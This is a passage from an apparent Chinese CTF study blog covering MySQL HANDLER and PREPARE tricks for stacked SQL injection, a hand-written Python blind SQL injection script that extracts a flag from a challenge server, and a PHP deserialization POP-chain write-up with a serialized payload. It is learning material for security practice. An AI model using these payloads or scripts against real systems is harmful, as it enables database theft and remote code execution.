class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><h2 id="0x03-更改表名"><a href="#0x03-更改表名" class="headerlink" title="0x03 更改表名"></a>0x03 更改表名</h2><p>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</p><h2 id="0x04-handle"><a href="#0x04-handle" class="headerlink" title="0x04 handle"></a>0x04 handle</h2><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 打开一个表名为 tbl_name 的表的句柄<br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br># <span class="hljs-number">1</span>、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">2</span>、通过索引查看表<br># <span class="hljs-keyword">FIRST</span>: 获取第一行（索引最小的一行）<br># NEXT: 获取下一行<br># PREV: 获取上一行<br># <span class="hljs-keyword">LAST</span>: 获取最后一行（索引最大的一行）<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">3</span>、不通过索引查看表<br># READ <span class="hljs-keyword">FIRST</span>: 获取句柄的第一行<br># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）<br># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># 关闭已打开的句柄<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br></code></pre></td></tr></table></figure><p>参考wp里的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure><p>更详细用法<br><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-19-盲注脚本编写</title>
    <link href="/2025/03/27/note-19-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
    <url>/2025/03/27/note-19-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="盲注脚本编写"><a href="#盲注脚本编写" class="headerlink" title="盲注脚本编写"></a>盲注脚本编写</h1><p>虽然以前做过一些盲注的题，也能根据需要改一下脚本，但是基本都是用网上wp或ai写的脚本，还没有自己写过脚本  </p><h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>先是一个输入框，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">All</span> You Want <span class="hljs-keyword">Is</span> <span class="hljs-keyword">In</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> the <span class="hljs-keyword">column</span> <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;flag&#x27;</span><br>Now, just give the id <span class="hljs-keyword">of</span> passage<br></code></pre></td></tr></table></figure><p>抓包就是post一个id参数，根据数字来显示不同内容<br>用bp fuzz了一下，没fuzz明白，<br>手动fuzz，搞得不明白的<br>最后还是看了别人的wp<br>然后尝试自己写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import requests</span><br><span class="hljs-comment"># str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># #if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br><span class="hljs-comment"># flag=&quot;&quot;</span><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     url=&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br><span class="hljs-comment">#     for st in str:</span><br><span class="hljs-comment">#         sql=&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;)),1,2)&quot;.format(i,st)</span><br><span class="hljs-comment">#         data=&#123;&quot;id&quot;:sql&#125;</span><br><span class="hljs-comment">#         re=requests.post(url,data=data,)</span><br><span class="hljs-comment">#         if &quot;Hello&quot; in re.text:</span><br><span class="hljs-comment">#             flag=flag+st</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#     print(flag)</span><br><br><span class="hljs-comment">#(0,128)二分法：</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment">#if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    url=<span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br>    sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&lt;64),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>    re=requests.post(url,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>,<span class="hljs-number">128</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span> <br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="在写的时候遇到的问题"><a href="#在写的时候遇到的问题" class="headerlink" title="在写的时候遇到的问题:"></a>在写的时候遇到的问题:</h2><p>requests语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.(请求方式，get或post)<br><br>re=requests.post(url,data,可选其它功能（如timeout=$）)<br><br><span class="hljs-comment">#re.text 就等于服务器返回内容中的字符内容</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><br>还有data内容的表示<br>data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br></code></pre></td></tr></table></figure><blockquote><p>for st in (1,128):<br>当时只猜测了flag的前两个字符，问了kimi，说我这个(1,128)的意思是数组，只会进行两次循环😅<br>正确语句<br>for st in range(64,128):</p></blockquote><p>第一次脚本跑的很慢，而且很容易与服务器断连，看别人wp有用二分法的，自己整了个二分法的版本出来  </p><p>这时又遇到了另一个问题<br>当初用requests时学别人wp加上了timeout&#x3D;10，动不动就超时</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">re</span>=requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>.timeout=10)</span><br></code></pre></td></tr></table></figure><p>然后就去掉了timeout，但还是很容易断连<br>于是又有了</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span><span class="hljs-literal">%i</span>)<br>得到：<br><br>第<span class="hljs-number">32</span>个字符<br>NSSCTF&#123;479a596c-<span class="hljs-number">2b47</span>-41ae-b4dc-<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>要是断连的话直接改一下这个起始字符就能继续爆了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>fuzz不会，没有清晰的思路的话真的很费劲，要多学学fuzz思路</p>]]></content>
    
    
    
    <tags>
      
      <tag>notice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-18</title>
    <link href="/2025/03/26/note-18/"/>
    <url>/2025/03/26/note-18/</url>
    
    <content type="html"><![CDATA[<h1 id="GDOUCTF-反方向的钟"><a href="#GDOUCTF-反方向的钟" class="headerlink" title="GDOUCTF_反方向的钟"></a>GDOUCTF_反方向的钟</h1><p>开篇源码，但是看不懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看大佬wp<br><a href="https://blog.csdn.net/weixin_73668856/article/details/134878471">https://blog.csdn.net/weixin_73668856/article/details/134878471</a></p><blockquote><p>先看看利用点：</p></blockquote><blockquote><p>应该是$_POST<a href="$_POST%5B'b'%5D">‘a’</a>;</p></blockquote><blockquote><p>尝试构造链子school::IPO() -&gt; school::__wakeup -&gt;classroom::hahaha-&gt;teacher</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>=<span class="hljs-string">&#x27;department&#x27;</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>=<span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$a</span>-&gt;department=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;leader=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br> <br>结果：                      <br>Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=<br></code></pre></td></tr></table></figure><p>不知道为啥我在原码后面直接构造死活输出不了  </p><p>又试了一次，学到对了一种新的构造语法  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span 